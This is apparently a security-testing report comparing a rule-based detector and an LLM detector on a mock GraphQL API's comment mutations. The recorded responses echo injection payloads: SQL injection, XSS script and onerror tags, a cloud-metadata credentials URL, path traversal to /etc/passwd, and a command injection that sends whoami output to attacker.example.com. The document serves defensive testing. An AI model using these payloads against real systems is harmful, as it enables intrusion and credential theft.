{
  "report_timestamp": "2025-10-05T21:46:26.274981",
  "api_url": "https://graphqlzero.almansi.me/api",
  "summary": {
    "total_comparisons": 10,
    "agreement_rate": 0.2,
    "simple_detections": 6,
    "llm_detections": 4,
    "consensus_breakdown": {
      "simple_only": 3,
      "both_detected": 3,
      "no_vulnerabilities": 3,
      "llm_only": 1
    },
    "detection_ratio": 0.6666666666666666,
    "potential_analysis": {
      "potential_agreement_rate": 0.0,
      "simple_potential_detections": 5,
      "llm_potential_detections": 2,
      "potential_consensus_breakdown": {
        "simple_potential_only": 5,
        "no_potential": 3,
        "llm_potential_only": 2
      },
      "potential_detection_ratio": 0.4
    }
  },
  "detailed_comparisons": [
    {
      "timestamp": "2025-10-05T21:44:54.047554",
      "node_name": "updateComment_response_2",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateComment": {
            "id": "2",
            "name": "Robert'); DROP TABLE comments; --",
            "body": "Testing SQL injection in name field"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "SQL Injection (SQLi) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
            "evidence": "Response status: 200, SQL patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Injection Attacks"
        ],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "simple_only",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:45:05.091977",
      "node_name": "updateComment_response_3",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateComment": {
            "id": "5",
            "name": "Mallory",
            "body": "<script>alert('xss')</script>"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Cross-Site Scripting (XSS) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
            "evidence": "Response status: 200, XSS patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: xss_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The GraphQL mutation updateComment returned the body field containing a raw <script> tag. This indicates the server is returning user-supplied HTML/JS without escaping or sanitization. If a client renders this value into the DOM using unsafe methods (for example innerHTML) it will execute in users' browsers, resulting in stored/reflected XSS. This can lead to session theft, account takeover, or other malicious actions. Recommended mitigations: perform server-side input validation, sanitize or remove HTML on input, apply strict output encoding/escaping for HTML contexts, and use a Content Security Policy (CSP) to reduce impact.",
            "evidence": "Response contains: \"data.updateComment.body\": \"<script>alert('xss')</script>\"",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "xss_injection",
              "severity": "HIGH",
              "confidence": 0.95,
              "evidence": "Response contains: \"data.updateComment.body\": \"<script>alert('xss')</script>\"",
              "explanation": "The GraphQL mutation updateComment returned the body field containing a raw <script> tag. This indicates the server is returning user-supplied HTML/JS without escaping or sanitization. If a client renders this value into the DOM using unsafe methods (for example innerHTML) it will execute in users' browsers, resulting in stored/reflected XSS. This can lead to session theft, account takeover, or other malicious actions. Recommended mitigations: perform server-side input validation, sanitize or remove HTML on input, apply strict output encoding/escaping for HTML contexts, and use a Content Security Policy (CSP) to reduce impact."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:45:19.505368",
      "node_name": "updateComment_response_4",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateComment": {
            "id": "6",
            "body": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "post": {
              "id": "2",
              "title": "qui est esse"
            }
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Server-Side Request Forgery (SSRF) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SSRF injection vulnerability detected - internal network access patterns found",
            "evidence": "Response status: 200, SSRF keywords detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Injection Attacks"
        ],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "simple_only",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:45:28.182131",
      "node_name": "updateComment_response_5",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateComment": {
            "id": "7",
            "name": "CmdInject",
            "body": "dummy; curl http://attacker.example.com/`whoami` || true"
          }
        }
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:45:37.470498",
      "node_name": "updateComment_response_6",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateComment": {
            "id": "8",
            "body": "../../../../../etc/passwd"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Path Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "Path injection vulnerability detected - file system access patterns found",
            "evidence": "Response status: 200, Path injection patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Injection Attacks"
        ],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "simple_only",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:45:53.335170",
      "node_name": "updateComment_response_7",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateComment": {
            "id": "9",
            "name": "HTMLTester",
            "body": "<img src=x onerror=alert(1) />"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "HTML Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "HTML injection vulnerability detected - HTML markup found in response",
            "evidence": "Response status: 200, HTML patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: html_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The GraphQL response returns raw HTML in the 'body' field (\"<img src=x onerror=alert(1) />\"). This is direct HTML/markup containing an event handler that would execute JavaScript if rendered into a page without proper encoding or sanitization. Because the API reflects/stores user-controllable content as HTML, a browser client that injects this value into the DOM unsafely would execute script (stored or reflected XSS). Remediation: sanitize or strip HTML on input, or ensure the client strictly escapes/encodes values before inserting into the DOM, and apply a Content Security Policy to mitigate script execution. Further testing should confirm whether rendered clients execute the payload (to distinguish reflected vs stored), but the returned unescaped HTML is clear evidence of HTML injection risk.",
            "evidence": "\"body\": \"<img src=x onerror=alert(1) />\"",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "html_injection",
              "severity": "HIGH",
              "confidence": 0.95,
              "evidence": "\"body\": \"<img src=x onerror=alert(1) />\"",
              "explanation": "The GraphQL response returns raw HTML in the 'body' field (\"<img src=x onerror=alert(1) />\"). This is direct HTML/markup containing an event handler that would execute JavaScript if rendered into a page without proper encoding or sanitization. Because the API reflects/stores user-controllable content as HTML, a browser client that injects this value into the DOM unsafely would execute script (stored or reflected XSS). Remediation: sanitize or strip HTML on input, or ensure the client strictly escapes/encodes values before inserting into the DOM, and apply a Content Security Policy to mitigate script execution. Further testing should confirm whether rendered clients execute the payload (to distinguish reflected vs stored), but the returned unescaped HTML is clear evidence of HTML injection risk."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:45:59.038559",
      "node_name": "updateComment_response_8",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:46:08.275993",
      "node_name": "updateComment_response_9",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:46:15.531617",
      "node_name": "updateComment_response_10",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Cannot query field \"updateComment\" on type \"Query\". Did you mean \"comment\"?",
            "locations": [
              {
                "line": 3,
                "column": 3
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: introspection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "The GraphQL error message is revealing schema information by suggesting an existing field name (\"comment\") when an invalid field (\"updateComment\") is queried. Although this is not a full introspection query response, the server leaks schema details via validation errors which can be used to enumerate available operations and types. This constitutes an introspection-related information disclosure vulnerability. An attacker could leverage these suggestions to map the schema and craft further queries or attacks. Recommended fixes: suppress detailed validation messages in production, return generic errors for invalid queries, and/or disable GraphQL introspection and field suggestions where appropriate.",
            "evidence": "Response error: \"Cannot query field \\\"updateComment\\\" on type \\\"Query\\\". Did you mean \\\"comment\\\"?\" (extensions.code: \"GRAPHQL_VALIDATION_FAILED\", status: 400)",
            "confidence": 0.9,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "introspection",
              "severity": "MEDIUM",
              "confidence": 0.9,
              "evidence": "Response error: \"Cannot query field \\\"updateComment\\\" on type \\\"Query\\\". Did you mean \\\"comment\\\"?\" (extensions.code: \"GRAPHQL_VALIDATION_FAILED\", status: 400)",
              "explanation": "The GraphQL error message is revealing schema information by suggesting an existing field name (\"comment\") when an invalid field (\"updateComment\") is queried. Although this is not a full introspection query response, the server leaks schema details via validation errors which can be used to enumerate available operations and types. This constitutes an introspection-related information disclosure vulnerability. An attacker could leverage these suggestions to map the schema and craft further queries or attacks. Recommended fixes: suppress detailed validation messages in production, return generic errors for invalid queries, and/or disable GraphQL introspection and field suggestions where appropriate."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [
          "Injection Attacks"
        ],
        "agreement_score": 0.0,
        "consensus": "llm_only",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [
            "Injection Attacks"
          ],
          "potential_agreement_score": 0.0,
          "potential_consensus": "llm_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T21:46:26.271042",
      "node_name": "updateComment_response_11",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Cannot query field \"emal\" on type \"Comment\". Did you mean \"email\"?",
            "locations": [
              {
                "line": 5,
                "column": 5
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          },
          {
            "message": "Cannot query field \"nam\" on type \"Comment\". Did you mean \"name\"?",
            "locations": [
              {
                "line": 6,
                "column": 5
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Field Suggestions Enabled",
            "detection": "vulnerable",
            "category": "Information Disclosure",
            "description": "Field suggestions enabled - potential information disclosure",
            "evidence": "Found \"did you mean\" in error message - field suggestions are enabled"
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Information Disclosure"
        ],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: field_suggestions",
            "detection": "potential",
            "category": "Unknown",
            "description": "The GraphQL error responses include automatic 'Did you mean \"<field>\"?' suggestions that reveal actual schema field names (email, name) when a client queries incorrect fields. This is an information disclosure vulnerability (field_suggestions) because it allows an attacker to enumerate valid field names and understand the schema without authentication, which can facilitate further targeted attacks or data discovery. Recommended mitigations: disable or suppress suggestion text in production error messages, return generic validation errors without exposing schema details, or configure GraphQL server options to avoid hinting (e.g., turn off suggestion/validation hints or run with non-debug mode).",
            "evidence": "Error messages: \"Cannot query field \\\"emal\\\" on type \\\"Comment\\\". Did you mean \\\"email\\\"?\" and \"Cannot query field \\\"nam\\\" on type \\\"Comment\\\". Did you mean \\\"name\\\"?\"",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "field_suggestions",
              "severity": "MEDIUM",
              "confidence": 0.95,
              "evidence": "Error messages: \"Cannot query field \\\"emal\\\" on type \\\"Comment\\\". Did you mean \\\"email\\\"?\" and \"Cannot query field \\\"nam\\\" on type \\\"Comment\\\". Did you mean \\\"name\\\"?\"",
              "explanation": "The GraphQL error responses include automatic 'Did you mean \"<field>\"?' suggestions that reveal actual schema field names (email, name) when a client queries incorrect fields. This is an information disclosure vulnerability (field_suggestions) because it allows an attacker to enumerate valid field names and understand the schema without authentication, which can facilitate further targeted attacks or data discovery. Recommended mitigations: disable or suppress suggestion text in production error messages, return generic validation errors without exposing schema details, or configure GraphQL server options to avoid hinting (e.g., turn off suggestion/validation hints or run with non-debug mode)."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Unknown"
        ],
        "potential_categories": [
          "Unknown"
        ]
      },
      "comparison": {
        "total_categories": [
          "Information Disclosure",
          "Unknown"
        ],
        "common_categories": [],
        "simple_unique_categories": [
          "Information Disclosure"
        ],
        "llm_unique_categories": [
          "Unknown"
        ],
        "agreement_score": 0.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Unknown"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [
            "Unknown"
          ],
          "potential_agreement_score": 0.0,
          "potential_consensus": "llm_potential_only"
        }
      }
    }
  ],
  "detector_analysis": {
    "simple_detector": {
      "description": "Rule-based detector using predefined patterns",
      "strengths": [
        "Fast execution",
        "Consistent results",
        "Low resource usage"
      ],
      "weaknesses": [
        "Limited to known patterns",
        "May miss novel attacks",
        "False negatives possible"
      ]
    },
    "llm_detector": {
      "description": "AI-powered detector using language model analysis",
      "strengths": [
        "Contextual understanding",
        "Novel attack detection",
        "Detailed analysis"
      ],
      "weaknesses": [
        "Slower execution",
        "Resource intensive",
        "Potential false positives"
      ]
    }
  }
}